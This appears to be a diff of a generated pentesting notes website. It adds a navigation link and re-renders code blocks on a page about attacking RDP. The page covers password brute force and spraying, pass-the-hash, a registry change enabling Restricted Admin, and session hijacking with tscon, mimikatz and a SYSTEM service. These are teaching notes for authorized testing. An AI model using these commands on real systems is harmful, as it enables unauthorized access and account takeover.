@@ -683,6 +683,8 @@
       
         
       
+        
+      
     
     
     
@@ -765,6 +767,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -17540,96 +17563,114 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p>RDP works at the application layer in the TCP/IP reference model, typically utilizing TCP port 3389 as the transport protocol. However, the connectionless UDP protocol can use port 3389 also for remote administration. The <code>Remote Desktop</code> service is installed by default on Windows servers and does not require additional external applications. This service can be activated using the <code>Server Manager</code> and comes with the default setting to allow connections to the service only to hosts with <a href="https://en.wikipedia.org/wiki/Network_Level_Authentication">Network level authentication</a> (<code>NLA</code>).</p>
 <h2 id="enumeration">Enumeration</h2>
 <p>Footprinting the service:</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="go">nmap -Pn -p3389 $ip </span>
-</span></code></pre></div>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="go">nmap -Pn -p3389 $ip </span>
+</span></code></pre></div></td></tr></table></div>
 <h3 id="rdp-sec-checkpl">rdp-sec-check.pl</h3>
 <p><a href="https://github.com/CiscoCXSecurity/rdp-sec-check">rdp-sec-check.pl</a> is a perl script to enumerate security settings of an RDP Service (AKA Terminal Services).</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/CiscoCXSecurity/rdp-sec-check.git<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>rdp-sec-check
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>./rdp-sec-check.pl<span class="w"> </span><span class="nv">$ip</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span>
+<span class="normal"><a href="#__codelineno-1-2">2</a></span>
+<span class="normal"><a href="#__codelineno-1-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/CiscoCXSecurity/rdp-sec-check.git<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>rdp-sec-check
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2"></a>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3"></a>./rdp-sec-check.pl<span class="w"> </span><span class="nv">$ip</span>
+</span></code></pre></div></td></tr></table></div>
 <h2 id="connection-with-rdp">Connection with rdp</h2>
 <p>To run Microsoft’s Remote Desktop Protocol (RDP) client, a command-line interface called Microsoft Terminal Services Client (MSTSC) is used.  We can connect to RDP servers on Linux using <a href="../xfreerdp/">xfreerdp</a>, <a href="../rdesktop/">rdesktop</a>, or Remmina and interact with the GUI of the server accordingly.</p>
 <h3 id="xfreerdp">xfreerdp</h3>
 <p><a href="../xfreerdp/">See xfreerdp</a>.</p>
 <p>We can first try to form an RDP session with the target by not providing any additional information for any switches other than the target IP address. This will make the script use your own username as the login username for the RDP session, thus testing guest login capabilities.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>xfreerdp<span class="w"> </span>/v:<span class="nv">$ip</span>
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="c1"># /v:$ip: Specifies the target IP of the host we would like to connect to.</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span>
+<span class="normal"><a href="#__codelineno-2-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>xfreerdp<span class="w"> </span>/v:<span class="nv">$ip</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a><span class="c1"># /v:$ip: Specifies the target IP of the host we would like to connect to.</span>
+</span></code></pre></div></td></tr></table></div>
 <p>Try to login with other default accounts, such as user, admin, Administrator, and so on.  We will also be specifying to the script that we would like to bypass all requirements for a security certificate so that our own script does not request them:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>xfreerdp<span class="w"> </span>/cert:ignore<span class="w"> </span>/u:Administrator<span class="w"> </span>/v:<span class="nv">$ip</span>
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="c1"># /cert:ignore : Specifies to the scrips that all security certificate usage should be ignored.</span>
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="c1"># /u:Administrator : Specifies the login username to be &quot;Administrator&quot;.</span>
-</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="c1"># /v:$ip: Specifies the target IP of the host we would like to connect to.</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span>
+<span class="normal"><a href="#__codelineno-3-2">2</a></span>
+<span class="normal"><a href="#__codelineno-3-3">3</a></span>
+<span class="normal"><a href="#__codelineno-3-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>xfreerdp<span class="w"> </span>/cert:ignore<span class="w"> </span>/u:Administrator<span class="w"> </span>/v:<span class="nv">$ip</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a><span class="c1"># /cert:ignore : Specifies to the scrips that all security certificate usage should be ignored.</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3"></a><span class="c1"># /u:Administrator : Specifies the login username to be &quot;Administrator&quot;.</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4"></a><span class="c1"># /v:$ip: Specifies the target IP of the host we would like to connect to.</span>
+</span></code></pre></div></td></tr></table></div>
 <p>If successful, during the initialization of the RDP session, we will be asked for a password. We can hit Enter to see if the process continue without one. 
 Sometimes there are severe mishaps in configurations like this and we can gain access.</p>
 <p>If you know user and credentials:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>xfreerdp<span class="w"> </span>/u:&lt;username&gt;<span class="w"> </span>/p:&lt;<span class="s2">&quot;password&quot;</span>&gt;<span class="w"> </span>/v:<span class="nv">$ip</span><span class="w"> </span>
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>
-</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="c1"># Sometimes there are some issues with certs and resolution. In those cases</span>
-</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>xfreerdp<span class="w"> </span>/v:<span class="nv">$ip</span><span class="w"> </span>/u:<span class="nv">$username</span><span class="w"> </span>/cert:ignore<span class="w"> </span>/dynamic-resolution
-</span></code></pre></div>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>xfreerdp<span class="w"> </span><span class="o">[</span>/d:domain<span class="o">]</span><span class="w"> </span>/u:&lt;username&gt;<span class="w"> </span>/p:&lt;password&gt;<span class="w"> </span>/v:<span class="nv">$ip</span>
-</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>
-</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="c1">#Pass the hash</span>
-</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>xfreerdp<span class="w"> </span><span class="o">[</span>/d:domain<span class="o">]</span><span class="w"> </span>/u:&lt;username&gt;<span class="w"> </span>/pth:&lt;hash&gt;<span class="w"> </span>/v:<span class="nv">$ip</span><span class="w"> </span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span>
+<span class="normal"><a href="#__codelineno-4-2">2</a></span>
+<span class="normal"><a href="#__codelineno-4-3">3</a></span>
+<span class="normal"><a href="#__codelineno-4-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>xfreerdp<span class="w"> </span>/u:&lt;username&gt;<span class="w"> </span>/p:&lt;<span class="s2">&quot;password&quot;</span>&gt;<span class="w"> </span>/v:<span class="nv">$ip</span><span class="w"> </span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a><span class="c1"># Sometimes there are some issues with certs and resolution. In those cases</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4"></a>xfreerdp<span class="w"> </span>/v:<span class="nv">$ip</span><span class="w"> </span>/u:<span class="nv">$username</span><span class="w"> </span>/cert:ignore<span class="w"> </span>/dynamic-resolution
+</span></code></pre></div></td></tr></table></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span>
+<span class="normal"><a href="#__codelineno-5-2">2</a></span>
+<span class="normal"><a href="#__codelineno-5-3">3</a></span>
+<span class="normal"><a href="#__codelineno-5-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a>xfreerdp<span class="w"> </span><span class="o">[</span>/d:domain<span class="o">]</span><span class="w"> </span>/u:&lt;username&gt;<span class="w"> </span>/p:&lt;password&gt;<span class="w"> </span>/v:<span class="nv">$ip</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2"></a>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3"></a><span class="c1">#Pass the hash</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4"></a>xfreerdp<span class="w"> </span><span class="o">[</span>/d:domain<span class="o">]</span><span class="w"> </span>/u:&lt;username&gt;<span class="w"> </span>/pth:&lt;hash&gt;<span class="w"> </span>/v:<span class="nv">$ip</span><span class="w"> </span>
+</span></code></pre></div></td></tr></table></div>
 <p><strong>Troubleshoot in PtH attack</strong></p>
 <p><em>Restricted Admin Mode</em>, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with an error. This can be enabled by adding a new registry key <code>DisableRestrictedAdmin</code> (REG_DWORD) under <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa</code> with the value of 0. It can be done using the following command:</p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">reg</span> <span class="n">add</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">System</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Control</span><span class="p">\</span><span class="n">Lsa</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">v</span> <span class="n">DisableRestrictedAdmin</span> <span class="p">/</span><span class="n">d</span> <span class="n">0x0</span> <span class="p">/</span><span class="n">f</span>
-</span></code></pre></div>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a><span class="n">reg</span> <span class="n">add</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">System</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Control</span><span class="p">\</span><span class="n">Lsa</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">v</span> <span class="n">DisableRestrictedAdmin</span> <span class="p">/</span><span class="n">d</span> <span class="n">0x0</span> <span class="p">/</span><span class="n">f</span>
+</span></code></pre></div></td></tr></table></div>
 <p>Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access.</p>
 <h3 id="rdesktop">rdesktop</h3>
 <p>See <a href="../rdesktop/">rdesktop</a>.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>rdesktop<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span><span class="nv">$ip</span>
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>rdesktop<span class="w"> </span>-d<span class="w"> </span>&lt;domain&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span><span class="nv">$ip</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span>
+<span class="normal"><a href="#__codelineno-7-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a>rdesktop<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span><span class="nv">$ip</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2"></a>rdesktop<span class="w"> </span>-d<span class="w"> </span>&lt;domain&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span><span class="nv">$ip</span>
+</span></code></pre></div></td></tr></table></div>
 <h2 id="attacks">Attacks</h2>
 <h3 id="password-guessing">Password guessing</h3>
 <h4 id="rdp_checkpy-from-impacket">rdp_check.py from Impacket</h4>
 <p>Since RDP takes user credentials for authentication, one common attack vector against the RDP protocol is password guessing. There is a tool for checking known credentials against RDP services.</p>
 <p>rdp_check.py from impacket let you check if some credentials are valid for a RDP service:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>rdp_check &lt;domain&gt;/&lt;name&gt;:&lt;password&gt;@$ip
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a>rdp_check &lt;domain&gt;/&lt;name&gt;:&lt;password&gt;@$ip
+</span></code></pre></div></td></tr></table></div>
 <h3 id="brute-force">Brute force</h3>
 <p>Just think it twice: in many cases, <strong>a user account will be locked or disabled after a certain number of failed login attempts</strong>.</p>
 <h4 id="ncrack">ncrack</h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>ncrack -vv --user &lt;User&gt; -P pwds.txt rdp://$ip
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a>ncrack -vv --user &lt;User&gt; -P pwds.txt rdp://$ip
+</span></code></pre></div></td></tr></table></div>
 <h4 id="hydra">hydra</h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>hydra -V -f -L &lt;userslist&gt; -P &lt;passwlist&gt; rdp://$ip
-</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>
-</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>hydra -L user.list -P password.list rdp://$ip
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span>
+<span class="normal"><a href="#__codelineno-10-2">2</a></span>
+<span class="normal"><a href="#__codelineno-10-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a>hydra -V -f -L &lt;userslist&gt; -P &lt;passwlist&gt; rdp://$ip
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2"></a>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3"></a>hydra -L user.list -P password.list rdp://$ip
+</span></code></pre></div></td></tr></table></div>
 <h3 id="password-spraying">Password Spraying</h3>
 <p>Be careful, you could lock accounts. </p>
 <h4 id="crowbar">Crowbar</h4>
 <p>See <a href="../crowbar/">crowbar</a>.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1"># https://github.com/galkan/crowbar</span>
-</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>crowbar<span class="w"> </span>-b<span class="w"> </span>rdp<span class="w"> </span>-s<span class="w"> </span><span class="nv">$ip</span>/32<span class="w"> </span>-U<span class="w"> </span>users.txt<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;password123&#39;</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span>
+<span class="normal"><a href="#__codelineno-11-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a><span class="c1"># https://github.com/galkan/crowbar</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2"></a>crowbar<span class="w"> </span>-b<span class="w"> </span>rdp<span class="w"> </span>-s<span class="w"> </span><span class="nv">$ip</span>/32<span class="w"> </span>-U<span class="w"> </span>users.txt<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;password123&#39;</span>
+</span></code></pre></div></td></tr></table></div>
 <h4 id="hydra_1">Hydra</h4>
 <p>See <a href="../hydra/">hydra</a>.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c1"># hydra</span>
-</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>hydra<span class="w"> </span>-L<span class="w"> </span>usernames.txt<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;password123&#39;</span><span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>rdp
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1">1</a></span>
+<span class="normal"><a href="#__codelineno-12-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a><span class="c1"># hydra</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2"></a>hydra<span class="w"> </span>-L<span class="w"> </span>usernames.txt<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;password123&#39;</span><span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>rdp
+</span></code></pre></div></td></tr></table></div>
 <h3 id="rdp-session-hijacking">RDP Session Hijacking</h3>
 <p>With SYSTEM privileges you can access any opened RDP session by any user without the need of knowing the password of the owner.</p>
 <p>Then, in Powershell, get opened sessions:</p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="n">query</span> <span class="n">user</span>
-</span></code></pre></div>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1"></a><span class="n">query</span> <span class="n">user</span>
+</span></code></pre></div></td></tr></table></div>
 <p>Access to the selected session:</p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="n">tscon</span> <span class="p">&lt;</span><span class="n">ID</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">dest</span><span class="p">:&lt;</span><span class="n">SESSIONNAME</span><span class="p">&gt;</span>
-</span></code></pre></div>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1"></a><span class="n">tscon</span> <span class="p">&lt;</span><span class="n">ID</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">dest</span><span class="p">:&lt;</span><span class="n">SESSIONNAME</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>Now you will be inside the selected RDP session and you will have impersonate a user using only Windows tools and features.</p>
 <p><strong>Important</strong>: When you access an active RDP sessions you will kickoff the user that was using it.</p>
 <p>You could get passwords from the process dumping it, but this method is much faster and led you interact with the virtual desktops of the user (passwords in notepad without been saved in disk, other RDP sessions opened in other machines...).</p>
 <h3 id="mimikatz-session-hijacking">Mimikatz Session Hijacking</h3>
 <p>You could also use mimikatz to steal a session:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>ts::sessions #Get sessions
-</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>ts::remote /id:2 #Connect to the session
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1">1</a></span>
+<span class="normal"><a href="#__codelineno-15-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a>ts::sessions #Get sessions
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2"></a>ts::remote /id:2 #Connect to the session
+</span></code></pre></div></td></tr></table></div>
 <p>Sticky-keys &amp; Utilman
 Combining this technique with stickykeys or utilman you will be able to access a administrative CMD and any RDP session anytime</p>
 <p>You can search RDPs that have been backdoored with one of these techniques already with: https://github.com/linuz/Sticky-Keys-Slayer</p>
@@ -17641,57 +17682,76 @@ Combining this technique with stickykeys or utilman you will be able to access a
 <li><strong>Escalation Path</strong>: Once PsExec launches a command prompt or other executable with SYSTEM privileges, the user essentially has unrestricted access. This enables them to perform actions that would other</li>
 </ul>
 <p><strong>Example of an exploitation: creating a service that will run as SYSTEM</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>query user
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-16-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1"></a>query user
+</span></code></pre></div></td></tr></table></div>
 <p>Results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a> USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
-</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>&gt;juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
-</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a> lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM
-</span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>sc.exe create Nameofservice binpath= &quot;cmd.exe /k tscon 2 /dest:rdp-tcp#13&quot;
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-17-1">1</a></span>
+<span class="normal"><a href="#__codelineno-17-2">2</a></span>
+<span class="normal"><a href="#__codelineno-17-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1"></a> USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2"></a>&gt;juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3"></a> lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM
+</span></code></pre></div></td></tr></table></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-18-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1"></a>sc.exe create Nameofservice binpath= &quot;cmd.exe /k tscon 2 /dest:rdp-tcp#13&quot;
+</span></code></pre></div></td></tr></table></div>
 <p><strong>Explanation</strong>: Create a Windows service that, by default, run as <code>Local System</code> and will execute any binary with <code>SYSTEM</code> privileges. We use <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create">Microsoft sc.exe</a> binary. First, we specify the service name (<code>Nameofservice</code>) and the <code>binpath</code>, which is the command we want to execute. Once we run the following command, a service named <code>Nameofservice</code> will be created.</p>
 <p>Initiate the service:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>net start Nameofservice
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-19-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1"></a>net start Nameofservice
+</span></code></pre></div></td></tr></table></div>
 <p>Once the service is started, a new terminal with the <code>lewen</code> user session will appear. With this new account, we can attempt to discover what kind of privileges it has on the network, and maybe we'll get lucky, and the user is a member of the Help Desk group with admin rights to many hosts or even a Domain Admin.</p>
 <h3 id="rdp-with-pth-attack">RDP with  PtH attack</h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>xfreerdp [/d:domain] /u:&lt;username&gt; /pth:&lt;hash&gt; /v:$ip
-</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a># /pth:&lt;hash&gt;   Pass the hash
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-20-1">1</a></span>
+<span class="normal"><a href="#__codelineno-20-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1"></a>xfreerdp [/d:domain] /u:&lt;username&gt; /pth:&lt;hash&gt; /v:$ip
